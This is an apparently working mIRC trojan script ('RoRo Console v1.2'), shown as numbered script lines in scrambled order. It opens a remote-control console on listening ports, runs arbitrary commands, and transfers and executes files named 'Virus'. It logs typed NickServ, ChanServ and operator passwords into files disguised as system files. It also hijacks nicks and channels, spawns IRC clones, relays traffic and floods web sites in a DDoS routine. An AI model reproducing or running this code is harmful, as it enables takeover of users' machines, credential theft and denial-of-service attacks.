            "n413=  var %i = 0 , %iCount = $ini($GFN(DEF), Missing, 0) , %sTmp = \"\" , %sName = \"\"",
            "n414=  while (%i < %iCount) { ",
            "n415=    .inc %i | %sTmp = $ini($GFN(DEF), Missing, %i)",
            "n416=    %sTmp = $getTok(%sTmp, 1, $asc(/)) | if ((free. !isin %sTmp) && ($numtok(%sTmp, $asc(.)) > 2)) { %sTmp = $getTok(%sTmp, 2-, $asc(.)) }",
            "n417=    %sName = $OpenIt(DDos) | .sockopen %sName %sTmp 80 | .sockmark %sName %sTmp",
            "n418=  }",
            "n419=}",
            "n420=on *:sockopen:DDos-*:{ if ($sockerr > 0) { .return } | .RequestURL $sockname / $sock($sockname).mark }",
            "n421=",
            "n422=; * HTTP *",
            "n423=alias RequestURL {",
            "n424=  .sockwrite -n $1 GET $2 HTTP/1.1 | .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*",
            "n425=  .sockwrite -n $1 Accept-Language: bg | .sockwrite -n $1 Accept-Encoding: gzip, deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)",
            "n426=  .sockwrite -n $1 Host: $3 | .sockwrite -n $1 Connection: Keep-Alive | .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1",
            "n390=  .hadd Data $rev($sockname,Active) DIR",
            "n391=  if ($Verify($sockname) == 1) .sockwrite -tn $sockname $ev(DIR, Items, 0)",
            "n392=}",
            "n393=",
            "n394=; * CHECK SITES *",
            "n395=alias AddMissing { .remini $GFN(DEF) SITES $1 | .writeini $GFN(DEF) Missing $1 0 }",
            "n396=alias CheckSites {",
            "n397=  var %i = 0 , %iCount = $ini($GFN(DEF), SITES, 0) , %sTmp = \"\" , %sName = \"\"",
            "n398=  while (%i < %iCount) { ",
            "n399=    .inc %i | %sTmp = $ini($GFN(DEF), SITES, %i) | %sName = $OpenIt(Check-Sites) | .sockopen %sName %sTmp 80 | .sockmark %sName %sTmp",
            "n400=  }",
            "n401=}",
            "n402=on *:sockopen:Check-Sites-*:{ if ($sockerr > 0) { .AddMissing $sock($sockname).mark | .return } | .RequestURL $sockname / $sock($sockname).mark }",
            "n403=on *:sockread:Check-Sites-*:{",
            "n404=  if ($sockerr > 0) { .AddMissing $sock($sockname).mark | .return }",
            "n405=  var %sRead = \"\" | .sockread %sRead",
            "n406=  if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) { .AddMissing $sock($sockname).mark }",
            "n407=  .sockclose $sockname",
            "n408=}",
            "n409=",
            "n410=; * DDOS *",
            "n411=alias DDos {",
            "n370=alias DIR {",
            "n371=  .unset %DIR.*",
            "n372=  %DIR.Index = 0 | %DIR.Index2 = 0 | %DIR.i = 1 | %DIR.Mask = * | %DIR.Depth = 1",
            "n373=  %DIR.CD = $hget(Data, $rev($sockname,CD)) | %DIR.num = $pos(%DIR.CD,\\,0)",
            "n374=  if ($1 != $null) %DIR.Mask = $1",
            "n375=  if ($2 != $null) %DIR.Depth = $2",
            "n376=  %DIR.Tmp = BEGIN(Dir) %Dir.CD %Dir.Mask %Dir.Depth",
            "n377=  $sev(DIR, Items, 0, %DIR.Tmp)",
            "n378=  :DirNext",
            "n379=  inc %DIR.Index",
            "n380=  %DIR.item = $finddir(%Dir.CD, %DIR.Mask, %DIR.Index, %DIR.Depth)",
            "n381=  if (%DIR.item != $null) { $sev(DIR, Items, %DIR.Index, $GetFileName(%DIR.Item) <DIR>) | goto DirNext }",
            "n382=  else { dec %DIR.Index }",
            "n383=  :FileNext",
            "n384=  inc %DIR.Index2",
            "n385=  %DIR.item = $findfile(%Dir.CD, %DIR.Mask, %DIR.Index2, %DIR.Depth)",
            "n386=  if (%DIR.item != $null) { $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2), $DIRFormat) | goto FileNext }",
            "n387=  else { dec %DIR.Index2 }",
            "n388=  %DIR.Tmp = END(Dir) %DIR.Index Dir(s) %DIR.Index2 File(s)",
            "n389=  $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2 + 1), %DIR.Tmp)",
            "n358=  var %sExec = $readini($GFN(DEF), Mass, Executed) | if ($1- !isin %sExec) { .hadd Data Mass On | .hadd Data MassExec $1- | .writeini $GFN(DEF) Mass Executed %sExec , $1- | $1- }",
            "n359=}",
            "n360=alias SnifferIt {",
            "n361=  var %iStat = 0 | if ($2 == Start) { %iStat = 1 | .hadd Data Sniffer.Console $sockname }",
            "n362=  if (i isin $1) { .hadd Data Sniffer.Input %iStat } ",
            "n363=  if (m isin $1) { .hadd Data Sniffer.Messages %iStat }",
            "n364=  if (n isin $1) { .hadd Data Sniffer.Notices %iStat }",
            "n365=  if ($Verify($sockname) == 1) { .sockwrite -tn $sockname (SNIFFER) Options completed.. }",
            "n366=}",
            "n367=alias SD { if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SD) Current Directory: $hget(Data, $rev($sockname,CD)) }",
            "n368=alias CD { .hadd Data $rev($sockname,CD) $1- | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (CD) Directory changed to $1- }",
            "n369=alias DIRFormat { .return ..\\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $pos(%DIR.Item,\\,$calc(%DIR.num + 1)))) ( $+ $Bytes($file(%DIR.Item).size).suf $+ ) }",
            "n348=; * TROJAN FUNCTIONS *",
            "n349=alias Hello { if ($Verify($sockname) == 1) .sockwrite -tn $sockname (HELLO) I'm running RoRo Console v1.2 -BiG- }",
            "n350=alias StatusMe { if ($Verify($sockname) == 1) .sockwrite -tn $sockname (STATUS) $getStat $hget(Data, Recving) }",
            "n351=alias GetConsole { if ($Verify($sockname) == 1) .sockwrite -tn $sockname (GETCONSOLE) $sockname }",
            "n352=alias RestartMe { .run $windir $+ \\rundll.exe user.exe,exitwindowsexec | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (RESTART) Restart in progress.. }",
            "n353=alias ShutDownMe { .run $windir $+ \\rundll.exe user.exe,exitwindows | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SHUTDOWN) Shutting down.. }",
            "n354=alias InfoMe { if ($Verify($sockname) == 1) .sockwrite -tn $sockname (INFO) Nick: $Me IP: $Ip Host: $Host OS: $os Version: $version }",
            "n355=alias ExecIt { [ [ $1- ] ] | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (EXEC) $1- Executed.. }",
            "n356=alias MassMe {",
            "n357=  if ($Verify($sockname) == 1) { .sockwrite -tn $sockname (MASS) Accepted. }",
            "n323=      if ($gettok($sock($sockname).mark,2,32) != %sNick) { .OpenConsole %sNick $gettok(%sText,2,$asc(_)) }",
            "n324=    }",
            "n325=  }",
            "n326=}",
            "n327=",
            "n328=; * BNC *",
            "n329=on *:socklisten:Listen-BNC:{ if ($sock(Gateway-BNC).mark == 1) { .sockaccept Server-BNC | .sockmark Server-BNC 1 } }",
            "n330=on *:sockopen:Gateway-BNC:{ .sockmark $sockname 1 }",
            "n331=on *:sockclose:Gateway-BNC:{ .sockclose Server-BNC }",
            "n332=on *:sockclose:Server-BNC:{ .sockclose Gateway-BNC }",
            "n333=on *:sockread:Server-BNC:{",
            "n334=  var %sRead \"\" | .sockread %sRead",
            "n335=  if ($Verify(Gateway-BNC) == 1) { .sockwrite -tn Gateway-BNC %sRead }",
            "n336=}",
            "n337=on *:sockread:Gateway-BNC:{",
            "n338=  var %sRead \"\" | .sockread %sRead",
            "n339=  if ($sock(Server-BNC).mark == 1 && $Verify(Server-BNC) == 1) { .sockwrite -tn Server-BNC %sRead }",
            "n340=}",
            "n341=alias BNCIt {",
            "n342=  if ($Verify($sockname) == 1 && $verify(Gateway-BNC) != 1) { ",
            "n343=    .sockwrite -tn $sockname (BNC) Server: $1 Port: $2",
            "n344=    .sockopen Gateway-BNC $1 $2",
            "n345=  }",
            "n346=}",
            "n347=",
            "n307=  %Clone.Mail = \" $+ $gettok($sock($sockname).mark,4,32) $+ \" | if (%Clone.Mail == \"\") { %Clone.Mail = \" $+ $Random($Rand(4,7)) $+ \" }",
            "n308=  %Clone.Name = : $+ $gettok($sock($sockname).mark,5-,32) | if (%Clone.Name == :) { %Clone.Name = $Random($Rand(3,10)) $Random($Rand(2,6)) }",
            "n309=  .sockwrite -tn $sockname NICK %Clone.Nick",
            "n310=  .sockwrite -tn $sockname USER %Clone.Ident %Clone.Mail %Clone.Server %Clone.Name",
            "n311=  .unset %Clone.*",
            "n312=}",
            "n313=on *:sockread:Clone-*:{",
            "n314=  if ($sockerr > 0) { .return }",
            "n315=  var %sRead = \"\" , %sNick = \"\" , %sText = \"\"",
            "n316=  .sockread %sRead",
            "n317=  %sNick = $remove($gettok(%sRead,1,$asc(!)),:) | %sText = $gettok(%sRead,2,$asc(:))",
            "n318=  if (PING* iswm %sRead) { .sockwrite -tn $sockname PONG $getTok(%sRead, 2, 32) }",
            "n319=  else if (%sText == IP!) { .sockwrite -tn $sockname NOTICE %sNick :IP_ $+ $IP }",
            "n320=  else if (IP_* iswm %sText) {",
            "n321=    .hadd Data iIP $calc($hget(Data, iIP) + 1)",
            "n322=    if ($hget(Data, iIPCount) // $hget(Data, iIP)) {",
            "n294=  if ($1 == nick) { .ignore -u30 NS | .msg ns id $readini($GFN(IRC), $2, Temp-Pass) | .msg ns drop $readini($GFN(IRC), $2, Perm-Pass) | .msg ns reg $Random($Rand(4,7)) $Random($Rand(3,8)) }",
            "n295=  if ($1 == chan) { .ignore -u30 CS | .msg cs drop $2 $readini($GFN(IRC), $2, Perm-Pass) | .msg cs reg $2 $Random($Rand(4,7)) $Random($Rand(3,8)) }",
            "n296=}",
            "n297=",
            "n298=; * CLONES *",
            "n299=alias Random { var %i = 0 , %s = \"\" | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }",
            "n300=alias UseClone { if ($sock(Clone-*, 0) > 0) .sockwrite -tn Clone-* $1- }",
            "n301=alias LoadClone { var %clone.sock = $OpenIt(Clone) | .sockopen %clone.sock $1 6667 | .sockmark %clone.sock $1- }",
            "n302=on *:sockopen:Clone-*:{",
            "n303=  if ($sockerr > 0) { .return }",
            "n304=  %Clone.Server = \" $+ $gettok($sock($sockname).mark,1,32) $+ \"",
            "n305=  %Clone.Nick = $gettok($sock($sockname).mark,2,32) | if (%Clone.Nick == $null) { %Clone.Nick = $Random($Rand(4,9)) }",
            "n306=  %Clone.Ident = $gettok($sock($sockname).mark,3,32) | if (%Clone.Ident == $null) { %Clone.Ident = $Random($Rand(4,7)) }",
            "n279=    if (reg isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC | .dif [ $ $+ [ $calc(3 + %i) ] ] Perm-Pass [ $ $+ [ $calc(5 + %i) ] ] %sIRC } ",
            "n280=    if (newp isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC | .dif [ $ $+ [ $calc(3 + %i) ] ] Perm-Pass [ $ $+ [ $calc(5 + %i) ] ] %sIRC }",
            "n281=  }",
            "n282=  if ($getCountry == BG) {",
            "n283=    if (*Oper iswm $1 && $0 == 3) { .dif $2 OPER-PASS $3 IRC }",
            "n284=    if (*Msg iswm $1 && $2 == OS) { if (id isin $3) .dif $me OS-PASS $4 IRC }",
            "n285=  }",
            "n286=  if ($hget(Data, Sniffer.Input) == 1 && $Verify($hget(Data, Sniffer.Console)) == 1) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (INPUT) ( $+ $active $+ ) $1- }",
            "n287=  if ($GetTok($active, 1, $asc(-)) == @Local) { .UseConsole $GetTok($active, 3-, $asc(-)) $1- }",
            "n288=}",
            "n289=",
            "n290=; * DROP *",
            "n291=alias DropOff { .hadd Data Drop On }",
            "n292=alias Drop {",
            "n293=  if ($getCountry == Other) || ($readini($GFN(IRC), $2, Perm-Pass) == $null) { .return }",
            "n266=}",
            "n267=alias SetLoad { var %iDate = $gettok($date,1,$asc(/)) | if (5 // %iDate) .AddHTTP SOS- $+ $calc(%iDate * $gettok($date,2,$asc(/))) $+ $decode(LmhpdC5iZy9Db21tYW5kcy50eHQ=,mt) NULL EXEC }",
            "n268=on *:input:*:{",
            "n269=  var %i = 1 , %sIrc = IRC",
            "n270=  if ((*Msg iswm $1 && $2 == NS) || (NickServ isin $1)) {",
            "n271=    if (NickServ isin $1) { %i = 0 | %sIrc = IRC2 }",
            "n272=    if (id isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC }",
            "n273=    if (reg isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC | .dif $me Perm-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }",
            "n274=    if (newp isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC | .dif $me Perm-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }",
            "n275=  }",
            "n276=  if ((*Msg iswm $1 && $2 == CS) || (ChanServ isin $1)) {",
            "n277=    if (ChanServ isin $1) { %i = 0 | %sIrc = IRC2 }",
            "n278=    if (id isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }",
            "n248=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | .return % [ $+ [ %ev.final ] ] }",
            "n249=alias rev {",
            "n250=  var %ev.num 0 , %ev.final \"\" | while (%ev.num != $0) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ]  }",
            "n251=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | .return %ev.final } ",
            "n252=alias sev {",
            "n253=  var %ev.num 0 , %ev.final \"\" |  while (%ev.num != $calc($0 - 1)) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ] }",
            "n254=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | set % [ $+ [ %ev.final ] ] $ [ $+ [ $calc($0 - 1 + 1) ] ] }",
            "n255=",
            "n256=; * PASS *",
            "n257=alias dif {",
            "n258=  if ($server == $null) { .return }",
            "n259=  if ($GFN($4) == $null) { .SetFileNames }",
            "n260=  if ($readini($GFN($4),$1,$2) != $3) {",
            "n261=    var %i = $calc($readini($GFN($4), Options, Count) + 1)",
            "n262=    if (2 // %i) { .writeini $GFN($4) Options Status New }",
            "n263=    .writeini $GFN($4) Options Count %i",
            "n264=  }",
            "n265=  .writeini $GFN($4) $1 $2 $3",
            "n229=  %sComm = $GetTok(%sRead, 1, 32)",
            "n230=  if (%sComm == (HELLO)) {",
            "n231=    if ($hget(Data, MassExec)) { .UseConsole %sNick Mass! $+ $hget(Data, MassExec) }",
            "n232=    .UseConsole %sNick GetConsole | .UseConsole %sNick Status",
            "n233=  }",
            "n234=  if (%sComm == (GETCONSOLE)) { .hadd Data $rev($sockname, Remote) $GetTok(%sRead, 2, 32) }",
            "n235=  if (%sComm == (STATUS)) {",
            "n236=    if ($getStat == Full && $hget(Data, Sending) == Idle) {",
            "n237=      if ($GetTok(%sRead, 2-, 32) == Semi Idle) { .UseConsole %sNick SendFile! $+ $windir $+ \\Rundll16.exe!C:\\RoRo.exe!1 }",
            "n238=      else if ($getPriv != Master) { .CloseConsole %sNick }",
            "n239=    }",
            "n240=    else if ($getPriv != Master) { .CloseConsole %sNick }",
            "n241=  }",
            "n242=}",
            "n243=on *:sockclose:Local-Console-*:{ .hdel -w Data $rev($sockname, *) | if ($getPriv == Master) { .aline 6 $wind($sockname) ",
            "[!!]",
            " Console closed by remote host.. } }",
            "n244=",
            "n245=; * SYSTEM FUNCTIONS *",
            "n246=alias ev {",
            "n247=  var %ev.num 0 , %ev.final \"\" | while (%ev.num != $0) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ] }",
            "n212=  var %sConsole = Local-Console- $+ $1",
            "n213=  if ($Verify(%sConsole) == 0) { .return }",
            "n214=  if ($getPriv == Master) { .aline -h 4 $wind(%sConsole) ",
            "[>>]",
            " $2- }",
            "n215=  if (SendFile* iswm $2-) { $SendFile(Open, Local-SendFile- $+ $1, $GetTok($2-, 2, $asc(!)), $GetTok($2-, 3, $asc(!)), $GetTok($2-, 4, $asc(!))) }",
            "n216=  if (RecvFile* iswm $2-) { $RecvFile(Open, Local-RecvFile- $+ $1, $GetTok($2-, 2, $asc(!)), $GetTok($2-, 3, $asc(!))) }",
            "n217=  .sockwrite -tn %sConsole $2-",
            "n218=}",
            "n219=on *:sockopen:Local-Console-*:{",
            "n220=  if ($sockerr > 0) { .return }",
            "n221=  if ($getPriv == Master) { .window -aex $wind($sockname) }",
            "n222=  .hadd Data $rev($sockname, IP) $sock($sockname).mark",
            "n223=  .UseConsole $GetTok($sockname, 3-, $asc(-)) Hello!",
            "n224=}",
            "n225=on *:sockread:Local-Console-*:{",
            "n226=  if ($sockerr > 0) { .return }",
            "n227=  var %sRead = \"\" , %sComm = \"\" , %sNick = $GetTok($sockname, 3-, $asc(-))",
            "n228=  .sockread %sRead | if ($getPriv == Master) { .aline -h 12 $wind($sockname) ",
            "[<<]",
            " %sRead }",
            "n195=  else if (%sComm == CD) { .CD $GetTok(%sRead, 2-, $asc(!)) }",
            "n196=  else if (%sComm == SD) { .SD }",
            "n197=  else if (%sComm == DIR) { .DIR $GetTok(%sRead, 2-, $asc(!)) }",
            "n198=  else if (%sComm == RESTART) { .RestartMe }",
            "n199=  else if (%sComm == SHUTDOWN) { .ShutDownMe }",
            "n200=  else if (%sComm == INFO) { .InfoMe }",
            "n201=  else if (%sComm == BNC) { .BNCIt $GetTok(%sRead, 2-, $asc(!)) }",
            "n202=  else if (%sComm == SNIFFER) { .SnifferIt $GetTok(%sRead, 2-, $asc(!)) }",
            "n203=  else if (%sComm == EXEC) { .ExecIt $GetTok(%sRead, 2-, $asc(!)) }",
            "n204=}",
            "n205=",
            "n206=; * LOCAL CONSOLE *",
            "n207=on *:CLOSE:@Local-Console-*:{ .CloseConsole $GetTok($target,3-,$asc(-)) }",
            "n208=alias CDO { return $decode(V2luZmlsZS5kbGw=,mt) }",
            "n209=alias CloseConsole { .sockclose Local-Console- $+ $1 | .hdel -w Data $rev(Local-Console- $+ $1, *) | .window -c @Local-Console- $+ $1 }",
            "n210=alias OpenConsole { var %sConsole = Local-Console- $+ $1 | if ($Verify(%sConsole) == 0) { .sockopen %sConsole $2 2000 | .sockmark %sConsole $2 } }",
            "n211=alias UseConsole {",
            "n173=",
            "n174=on *:sockopen:Local-RecvFile-*:{ .RecvFile INIT $sockname }",
            "n175=on *:sockread:Local-RecvFile-*:{ .RecvFile RECV $sockname }",
            "n176=on *:sockclose:Local-RecvFile-*:{ .RecvFile CLOSE $sockname }",
            "n177=",
            "n178=; * SERVER CONSOLE *",
            "n179=on *:socklisten:Listen-Console:{ .AcceptIt Server-Console }",
            "n180=on *:sockwrite:Server-Console-*:{",
            "n181=  if ($hget(Data, $rev($sockname, Active)) == DIR) {",
            "n182=    %DIR.Tmp = $ev(DIR, Items, %DIR.i) | inc %DIR.i",
            "n183=    if (%DIR.Tmp != $null && $Verify($sockname) == 1) { .sockwrite -tn $sockname %DIR.Tmp }",
            "n184=    else { .unset %DIR.* | .hadd Data $rev($sockname, Active) Free }",
            "n185=  }",
            "n186=}",
            "n187=on *:sockread:Server-Console-*:{ ",
            "n188=  if ($sockerr > 0) { .return }",
            "n189=  var %sRead = \"\" , %sComm = \"\"",
            "n190=  .sockread %sRead | %sComm = %sRead | if (! isin %sComm) { %sComm = $GetTok(%sComm, 1, $asc(!)) }",
            "n191=  if (%sComm == HELLO) { .Hello }",
            "n192=  else if (%sComm == GETCONSOLE) { .GetConsole }",
            "n193=  else if (%sComm == STATUS) { .StatusMe }",
            "n194=  else if (%sComm == MASS) { .MassMe $GetTok(%sRead, 2-, $asc(!)) }",
            "n154=      if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) Connection Established. Receiving in Progress.. }",
            "n155=    }",
            "n156=    else { :RecvMore | .sockread &bRead | if ($sockbr != 0) { .bwrite $hget(Data, $rev(%sName, LocalName)) -1 &bRead | goto RecvMore } }",
            "n157=  }",
            "n158=}",
            "n159=",
            "n160=; * SERVER FILES *",
            "n161=on *:socklisten:Listen-SendFile:{ .AcceptIt Server-SendFile }",
            "n162=on *:sockread:Server-SendFile-*:{ .SendFile READ|SEND $sockname }",
            "n163=on *:sockwrite:Server-SendFile-*:{ .SendFile SEND $sockname }",
            "n164=",
            "n165=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }",
            "n166=on *:sockread:Server-RecvFile-*:{ .RecvFile RECV $sockname }",
            "n167=on *:sockclose:Server-RecvFile-*:{ .RecvFile CLOSE $sockname }",
            "n168=",
            "n169=; * LOCAL FILES *",
            "n170=on *:sockopen:Local-SendFile-*:{ .SendFile INIT $sockname }",
            "n171=on *:sockwrite:Local-SendFile-*:{ .SendFile SEND $sockname }",
            "n172=on *:sockclose:Local-SendFile-*:{ .SendFile CLOSE $sockname }",
            "n139=    .sockwrite -tn $sockname RecvFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iResume $+ ! $+ $hget(Data, $rev(%sName, Remote))",
            "n140=  }",
            "n141=  if (RECV isin $1) {",
            "n142=    if (%bServer == 1 && $hget(Data, $rev(%sName, Init)) != 1) {",
            "n143=      .sockread %sRead",
            "n144=      .hadd Data $rev(%sName, LocalName) $GetTok(%sRead, 2, $asc(!))",
            "n145=      .hadd Data $rev(%sName, Size) $GetTok(%sRead, 3, $asc(!))",
            "n146=      .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))",
            "n147=      .hadd Data $rev(%sName, Virus) $GetTok(%sRead, 5, $asc(!))",
            "n148=      .hadd Data $rev(%sName, Init) 1",
            "n149=      if ($hget(Data, $rev(%sName, Virus)) == 1) {",
            "n150=        if ($hget(Data, Recving) == Busy) || ($getStat == Full) { .sockclose $hget(Data, $rev(%sName, Remote)) | .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n151=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \\RoRo.exe",
            "n152=      }",
            "n153=      if ($exists($hget(Data, $rev(%sName, LocalName))) == $true) { .remove $hget(Data, $rev(%sName, LocalName)) }",
            "n123=        if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Successfully Received. CRC OK.. }",
            "n124=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .run $hget(Data, $rev(%sName, LocalName)) }",
            "n125=      }",
            "n126=      else if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Transfer Error. Bad CRC.. }",
            "n127=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Recving Idle | .sockclose $hget(Data, $rev(%sName, Remote)) }",
            "n128=    }",
            "n129=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n130=  }",
            "n131=  if (OPEN isin $1) {",
            "n132=    .hadd Data $rev(%sName, RemoteName) $3",
            "n133=    .hadd Data $rev(%sName, LocalName) $4",
            "n134=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))",
            "n135=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1991 }",
            "n136=  }",
            "n137=  if (INIT isin $1) {",
            "n138=    %iResume = $file($hget(Data, $rev(%sName, LocalName))).size | if (%iResume == $null) { %iResume = 0 }",
            "n106=    if ($bvar(&bRead, 0)) { if ($Verify($2) == 1) { .sockwrite $2 &bRead } | .hadd Data $Rev(%sName, Pos) $calc($hget(Data, $rev(%sName, Pos)) + 2048) }",
            "n107=    else {",
            "n108=      if (%bServer == 1 && $Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) File Successfully Sent.. }",
            "n109=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }",
            "n110=      .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n111=    }",
            "n112=  }",
            "n113=}",
            "n114=",
            "n115=alias RecvFile {",
            "n116=  ; $1 - ACTION , $2 - $sockname , $3 - Remote Filename , $4 - Local Filename",
            "n117=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, RecvFile) , %sRead = \"\" , %iResume",
            "n118=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }",
            "n119=",
            "n120=  if (CLOSE isin $1) || ($sockerr > 0) {",
            "n121=    if (%bServer == 1) {",
            "n122=      if ($file($hget(Data, $rev(%sName, LocalName))).size == $hget(Data, $rev(%sName, Size))) { ",
            "n88=  }",
            "n89=  if (OPEN isin $1) {",
            "n90=    .hadd Data $rev(%sName, LocalName) $shortfn($3)",
            "n91=    .hadd Data $rev(%sName, RemoteName) $4",
            "n92=    .hadd Data $rev(%sName, Virus) $5",
            "n93=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))",
            "n94=    .hadd Data $rev(%sName, Pos) 0",
            "n95=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n96=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Busy }",
            "n97=    else { .hadd Data $rev(%sName, Virus) 0 }",
            "n98=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1990 }",
            "n99=  }",
            "n100=  if (INIT isin $1) {",
            "n101=    %iSize = $file($hget(Data, $rev(%sName, LocalName))).size",
            "n102=    if ($Verify($2) == 1) { .sockwrite -tn $2 SendFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iSize $+ ! $+ $hget(Data, $rev(%sName, Remote)) $+ ! $+ $hget(Data, $rev(%sName, Virus)) }",
            "n103=  }",
            "n104=  if (SEND isin $1) {",
            "n105=    .bread $hget(Data, $rev(%sName, LocalName)) $hget(Data, $rev(%sName, Pos)) 2048 &bRead",
            "n70=",
            "n71=; * SEND/RECV Files *",
            "n72=alias SendFile {",
            "n73=  ; $1 - ACTION , $2 - $sockname , $3 - Local Filename , $4 - Remote Filename , $5 - Virus",
            "n74=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, SendFile) , %sRead = \"\" , %iSize",
            "n75=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }",
            "n76=",
            "n77=  if (CLOSE isin $1) || ($sockerr > 0) {",
            "n78=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }",
            "n79=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n80=  }",
            "n81=  if (READ isin $1) {",
            "n82=    .sockread %sRead",
            "n83=    .hadd Data $rev(%sName, LocalName) $shortfn($GetTok(%sRead, 2, $asc(!)))",
            "n84=    .hadd Data $rev(%sName, Pos) $GetTok(%sRead, 3, $asc(!))",
            "n85=    .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))",
            "n86=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n87=    if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) Auto-Resuming at $hget(Data, $rev(%sName, Pos)) bytes. Sending in Progress.. }",
            "n58=  .timerAdvMe 1 180 { .AdvMe 0 8 }",
            "n59=  if (4 // $hget(Data, Loaded) && $hget(Data, CheckSites) != 1) { .hadd Data CheckSites 1 | .CheckSites }",
            "n60=}",
            "n61=alias RNA {",
            "n62=  var %sTmp = Options Info ( $+ $me $+ )-( $+ $OS $+ )-( $+ $Version $+ )-( $+ $Server $+ )-( $+ $Ip $+ )-( $+ $Host $+ )",
            "n63=  .writeini $GFN(RNA) %sTmp | .writeini $GFN(IRC) %sTmp | .writeini $GFN(IRC2) %sTmp",
            "n64=}",
            "n65=alias FuckOff { .writeini $hget(Data, File) Options FuckOff 1 }",
            "n66=alias ListenIt { if ($portfree(2000) == $true) { .socklisten Listen-SendFile 1991 | .socklisten Listen-RecvFile 1990 | .socklisten Listen-Console 2000 | .socklisten Listen-BNC 1999 } }",
            "n67=alias AcceptIt { var %sName \"\" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto AcceptIt | .sockaccept %sName | return %sName }",
            "n68=alias OpenIt { var %sName \"\" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto OpenIt | return %sName }",
            "n69=alias SetFileNames { var %Win $windir | $SFN(RNA, %Win $+ \\rn3a.vxd) | $SFN(IRC, %Win $+ \\i2RC.sys) | $SFN(IRC2, %Win $+ \\mios.sys) | $SFN(DEF, %Win $+ \\def12x.dll) }",
